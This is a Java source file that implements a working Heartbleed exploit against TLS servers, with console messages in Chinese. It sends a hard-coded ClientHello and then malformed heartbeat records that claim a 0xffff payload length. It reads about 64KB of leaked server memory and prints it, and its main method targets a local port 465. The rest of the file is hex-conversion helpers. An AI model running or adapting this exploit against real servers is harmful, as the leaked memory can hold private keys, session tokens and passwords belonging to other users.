package me.jameszhan.samples.heartbeat;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.Socket;
import java.net.UnknownHostException;

/**
 * Created with IntelliJ IDEA.
 *
 * @author zizhi.zhzzh
 *         Date: 16/3/8
 *         Time: PM11:51
 */
public class Heartbleed {

    private static byte[] hello = {(byte) 0x16, (byte) 0x03, (byte) 0x02,
            (byte) 0x00, (byte) 0xdc, (byte) 0x01, (byte) 0x00, (byte) 0x00,
            (byte) 0xd8, (byte) 0x03, (byte) 0x02, (byte) 0x53, (byte) 0x43,
            (byte) 0x5b, (byte) 0x90, (byte) 0x9d, (byte) 0x9b, (byte) 0x72,
            (byte) 0x0b, (byte) 0xbc, (byte) 0x0c, (byte) 0xbc, (byte) 0x2b,
            (byte) 0x92, (byte) 0xa8, (byte) 0x48, (byte) 0x97, (byte) 0xcf,
            (byte) 0xbd, (byte) 0x39, (byte) 0x04, (byte) 0xcc, (byte) 0x16,
            (byte) 0x0a, (byte) 0x85, (byte) 0x03, (byte) 0x90, (byte) 0x9f,
            (byte) 0x77, (byte) 0x04, (byte) 0x33, (byte) 0xd4, (byte) 0xde,
            (byte) 0x00, (byte) 0x00, (byte) 0x66, (byte) 0xc0, (byte) 0x14,
            (byte) 0xc0, (byte) 0x0a, (byte) 0xc0, (byte) 0x22, (byte) 0xc0,
            (byte) 0x21, (byte) 0x00, (byte) 0x39, (byte) 0x00, (byte) 0x38,
            (byte) 0x00, (byte) 0x88, (byte) 0x00, (byte) 0x87, (byte) 0xc0,
            (byte) 0x0f, (byte) 0xc0, (byte) 0x05, (byte) 0x00, (byte) 0x35,
            (byte) 0x00, (byte) 0x84, (byte) 0xc0, (byte) 0x12, (byte) 0xc0,
            (byte) 0x08, (byte) 0xc0, (byte) 0x1c, (byte) 0xc0, (byte) 0x1b,
            (byte) 0x00, (byte) 0x16, (byte) 0x00, (byte) 0x13, (byte) 0xc0,
            (byte) 0x0d, (byte) 0xc0, (byte) 0x03, (byte) 0x00, (byte) 0x0a,
            (byte) 0xc0, (byte) 0x13, (byte) 0xc0, (byte) 0x09, (byte) 0xc0,
            (byte) 0x1f, (byte) 0xc0, (byte) 0x1e, (byte) 0x00, (byte) 0x33,
            (byte) 0x00, (byte) 0x32, (byte) 0x00, (byte) 0x9a, (byte) 0x00,
            (byte) 0x99, (byte) 0x00, (byte) 0x45, (byte) 0x00, (byte) 0x44,
            (byte) 0xc0, (byte) 0x0e, (byte) 0xc0, (byte) 0x04, (byte) 0x00,
            (byte) 0x2f, (byte) 0x00, (byte) 0x96, (byte) 0x00, (byte) 0x41,
            (byte) 0xc0, (byte) 0x11, (byte) 0xc0, (byte) 0x07, (byte) 0xc0,
            (byte) 0x0c, (byte) 0xc0, (byte) 0x02, (byte) 0x00, (byte) 0x05,
            (byte) 0x00, (byte) 0x04, (byte) 0x00, (byte) 0x15, (byte) 0x00,
            (byte) 0x12, (byte) 0x00, (byte) 0x09, (byte) 0x00, (byte) 0x14,
            (byte) 0x00, (byte) 0x11, (byte) 0x00, (byte) 0x08, (byte) 0x00,
            (byte) 0x06, (byte) 0x00, (byte) 0x03, (byte) 0x00, (byte) 0xff,
            (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x49, (byte) 0x00,
            (byte) 0x0b, (byte) 0x00, (byte) 0x04, (byte) 0x03, (byte) 0x00,
            (byte) 0x01, (byte) 0x02, (byte) 0x00, (byte) 0x0a, (byte) 0x00,
            (byte) 0x34, (byte) 0x00, (byte) 0x32, (byte) 0x00, (byte) 0x0e,
            (byte) 0x00, (byte) 0x0d, (byte) 0x00, (byte) 0x19, (byte) 0x00,
            (byte) 0x0b, (byte) 0x00, (byte) 0x0c, (byte) 0x00, (byte) 0x18,
            (byte) 0x00, (byte) 0x09, (byte) 0x00, (byte) 0x0a, (byte) 0x00,
            (byte) 0x16, (byte) 0x00, (byte) 0x17, (byte) 0x00, (byte) 0x08,
            (byte) 0x00, (byte) 0x06, (byte) 0x00, (byte) 0x07, (byte) 0x00,
            (byte) 0x14, (byte) 0x00, (byte) 0x15, (byte) 0x00, (byte) 0x04,
            (byte) 0x00, (byte) 0x05, (byte) 0x00, (byte) 0x12, (byte) 0x00,
            (byte) 0x13, (byte) 0x00, (byte) 0x01, (byte) 0x00, (byte) 0x02,
            (byte) 0x00, (byte) 0x03, (byte) 0x00, (byte) 0x0f, (byte) 0x00,
            (byte) 0x10, (byte) 0x00, (byte) 0x11, (byte) 0x00, (byte) 0x23,
            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x0f, (byte) 0x00,
            (byte) 0x01, (byte) 0x01};
    private static byte[] bleed = {(byte) 0x18, (byte) 0x03, (byte) 0x02,
            (byte) 0x00, (byte) 0x03, (byte) 0x01, (byte) 0xff, (byte) 0xff};
    private static byte[] tmp;
    private static byte[] pay;

    /**
     * SSL3_RT_CHANGE_CIPHER_SPEC 20
     * SSL3_RT_ALERT 21
     * SSL3_RT_HANDSHAKE 22
     * SSL3_RT_APPLICATION_DATA 23
     * TLS1_RT_HEARTBEAT 24
     *
     * @param args
     * @throws Exception
     */
    public static void main(String[] args) {
        attack("127.0.0.1", 465);
        System.exit(0);
    }

    public static boolean attack(String host, int port) {
        System.out.println("开始连接...");
        Socket socket = null;
        try {
            socket = new Socket(host, port);
        } catch (UnknownHostException e) {
            System.out.println("未知主机.");
            return false;
        } catch (IOException e) {
            System.out.println("访问主机失败.");
            return false;
        }
        OutputStream out = null;
        try {
            out = socket.getOutputStream();
        } catch (IOException e) {
            System.out.println("获取输出流失败.");
            return false;
        }
        InputStream in = null;
        try {
            in = socket.getInputStream();
        } catch (IOException e) {
            System.out.println("获取输入流失败.");
            return false;
        }
        System.out.println("发送客户端心跳包...");
        try {
            out.write(hello);
        } catch (IOException e) {
            System.out.println("发送心跳包失败.");
            return false;
        }
        System.out.println("等待服务器心跳包...");
        while (true) {
            tmp = getData(in, 5);
            if (tmp[0] == 0) {
                System.out.println("服务器没有返回心跳包并且关闭了连接.");
                return false;
            }
            analyseHead(tmp);
            int len = (int) MyByte.HexString2Long(MyByte
                    .byteToHexString(tmp[3]) + MyByte.byteToHexString(tmp[4]));
            pay = getData(in, len);
            if (tmp[0] == 22 && pay[0] == 0x0E) {
                System.out.println("查找到返回正常的心跳包。");
                break;
            }
        }
        System.out.println("发送heartbeat心跳包...");
        try {
            out.write(bleed);
        } catch (IOException e) {
            System.out.println("发送heartbeat心跳包失败.");
            return false;
        }
        try {
            out.write(bleed);
        } catch (IOException e) {
            System.out.println("发送heartbeat心跳包失败.");
            return false;
        }
        while (true) {
            tmp = getData(in, 5);
            int len = (int) MyByte.HexString2Long(MyByte
                    .byteToHexString(tmp[3]) + MyByte.byteToHexString(tmp[4]));
            if (tmp[0] == 0) {
                System.out.println("没有heartbeat返回接收到, 服务器看起来不是易受攻击的");
                return false;
            }
            if (tmp[0] == 24) {
                System.out.println("接收到heartbeat返回:");
                int count = 0;//长度计数
                for (int i = 0; i < 4; i++) {//读4次，全部读出64KB
                    pay = getData(in, len);
                    count += pay.length;
                    System.out.print(hexdump(pay));
                }
                System.out.println("\n数据长度为:" + count);
                if (len > 3) {
                    System.out
                            .println("警告: 服务器返回了原本比它多的数据 -服务器是易受攻击的!");
                } else {
                    System.out
                            .println("服务器返回畸形的heartbeat, 没有返回其他额外的数据");
                }
                break;
            }
            if (tmp[0] == 21) {
                System.out.println("接收到警告:");
                System.out.println(hexdump(pay));
                System.out.println("服务器返回错误,看起来不是易受攻击的");
                break;
            }
        }
        try {
            out.close();
            in.close();
        } catch (IOException e) {
            System.out.println("关闭输入输出流异常");
        }
        return true;
    }

    public static byte[] getData(InputStream in, int lenth) {
        byte[] t = new byte[lenth];
        try {
            in.read(t);
        } catch (IOException e) {
            System.out.println("接受数据错误");
        }
        return t;
    }

    public static String hexdump(byte[] pay) {
        String s = "";
        try {
            s = new String(pay, "GB2312");
        } catch (UnsupportedEncodingException e) {
            System.out.println("未知编码");
        }
        return s;
    }

    public static void analyseHead(byte[] tmp) {
        System.out.print("接收到消息: ");
        System.out.print("类型:" + tmp[0] + "\t");
        System.out.print("版本:" + MyByte.byteToHexString(tmp[1])
                + MyByte.byteToHexString(tmp[2]) + "\t");
        System.out.println("长度:"
                + MyByte.HexString2Long(MyByte.byteToHexString(tmp[3])
                + MyByte.byteToHexString(tmp[4])));
    }


    static class MyByte {
        /**
         * 字符串转换成十六进制字符串
         *
         * @param str 待转换的ASCII字符串
         * @return String 每个Byte之间空格分隔，如: [61 6C 6B]
         */
        public static String str2HexStr(String str) {
            char[] chars = "0123456789ABCDEF".toCharArray();
            StringBuilder sb = new StringBuilder("");
            byte[] bs = str.getBytes();
            int bit;
            for (int i = 0; i < bs.length; i++) {
                bit = (bs[i] & 0x0f0) >> 4;
                sb.append(chars[bit]);
                bit = bs[i] & 0x0f;
                sb.append(chars[bit]);
                sb.append(' ');
            }
            return sb.toString().trim();
        }

        /**
         * 十六进制转换字符串
         *
         * @param hexStr str Byte字符串(Byte之间无分隔符 如:[616C6B])
         * @return String 对应的字符串
         */
        public static String hexStr2Str(String hexStr) {
            String str = "0123456789ABCDEF";
            char[] hexs = hexStr.toCharArray();
            byte[] bytes = new byte[hexStr.length() / 2];
            int n;
            for (int i = 0; i < bytes.length; i++) {
                n = str.indexOf(hexs[2 * i]) * 16;
                n += str.indexOf(hexs[2 * i + 1]);
                bytes[i] = (byte) (n & 0xff);
            }
            return new String(bytes);
        }

        /**
         * String的字符串转换成unicode的String
         *
         * @param strText 全角字符串
         * @return String 每个unicode之间无分隔符
         * @throws Exception
         */
        public static String strToUnicode(String strText) throws Exception {
            char c;
            StringBuilder str = new StringBuilder();
            int intAsc;
            String strHex;
            for (int i = 0; i < strText.length(); i++) {
                c = strText.charAt(i);
                intAsc = (int) c;
                strHex = Integer.toHexString(intAsc);
                if (intAsc > 128)
                    str.append("\\u" + strHex);
                else
                    // 低位在前面补00
                    str.append("\\u00" + strHex);
            }
            return str.toString();
        }

        /**
         * unicode的String转换成String的字符串
         *
         * @param hex 16进制值字符串 （一个unicode为2byte）
         * @return String 全角字符串
         */
        public static String unicodeToString(String hex) {
            int t = hex.length() / 6;
            StringBuilder str = new StringBuilder();
            for (int i = 0; i < t; i++) {
                String s = hex.substring(i * 6, (i + 1) * 6);
                // 高位需要补上00再转
                String s1 = s.substring(2, 4) + "00";
                // 低位直接转
                String s2 = s.substring(4);
                // 将16进制的string转为int
                int n = Integer.valueOf(s1, 16) + Integer.valueOf(s2, 16);
                // 将int转换为字符
                char[] chars = Character.toChars(n);
                str.append(new String(chars));
            }
            return str.toString();
        }

        /**
         * 合并两个byte数组
         *
         * @param pByteA
         * @param pByteB
         * @return
         */
        public static byte[] getMergeBytes(byte[] pByteA, byte[] pByteB) {
            int aCount = pByteA.length;
            int bCount = pByteB.length;
            byte[] b = new byte[aCount + bCount];
            for (int i = 0; i < aCount; i++) {
                b[i] = pByteA[i];
            }
            for (int i = 0; i < bCount; i++) {
                b[aCount + i] = pByteB[i];
            }
            return b;
        }

        /**
         * 截取byte数据
         *
         * @param b 是byte数组
         * @param j 是大小
         * @return
         */
        public static byte[] cutOutByte(byte[] b, int j) {
            if (b.length == 0 || j == 0) {
                return null;
            }
            byte[] tmp = new byte[j];
            for (int i = 0; i < j; i++) {
                tmp[i] = b[i];
            }
            return tmp;
        }

        /**
         * 16进制字符串转换byte数组
         *
         * @param hexstr String 16进制字符串
         * @return byte[] byte数组
         */
        public static byte[] HexString2Bytes(String hexstr) {
            byte[] b = new byte[hexstr.length() / 2];
            int j = 0;
            for (int i = 0; i < b.length; i++) {
                char c0 = hexstr.charAt(j++);
                char c1 = hexstr.charAt(j++);
                b[i] = (byte) ((parse(c0) << 4) | parse(c1));
            }
            return b;
        }

        private static int parse(char c) {
            if (c >= 'a')
                return (c - 'a' + 10) & 0x0f;
            if (c >= 'A')
                return (c - 'A' + 10) & 0x0f;
            return (c - '0') & 0x0f;
        }

        /**
         * byte转换为十六进制字符串，如果为9以内的，用0补齐
         *
         * @param b
         * @return
         */
        public static String byteToHexString(byte b) {
            String stmp = Integer.toHexString(b & 0xFF);
            stmp = (stmp.length() == 1) ? "0" + stmp : stmp;
            return stmp.toUpperCase();
        }

        /**
         * 将byte转换为int
         *
         * @param b
         * @return
         */
        public static int byteToInt(byte b) {
            return Integer.valueOf(b);
        }

        /**
         * bytes转换成十六进制字符串
         *
         * @param b byte数组
         * @return String 每个Byte值之间空格分隔
         */
        public static String byteToHexString(byte[] b) {
            String stmp = "";
            StringBuilder sb = new StringBuilder("");
            for (byte c : b) {
                stmp = Integer.toHexString(c & 0xFF);// 与预算，去掉byte转int带来的补位
                sb.append((stmp.length() == 1) ? "0" + stmp : stmp);// 是一位的话填充零
                sb.append(" ");// 每位数据用空格分隔
            }
            return sb.toString().toUpperCase().trim();// 变换大写，并去除首尾空格
        }

        public static long HexString2Long(String hexstr) {
            long sum = 0;
            int length = hexstr.length();
            for (int i = 0; i < length; i++) {
                sum += parse(hexstr.charAt(i)) * Math.pow(16, length - i - 1);
            }
            return sum;
        }
    }


}
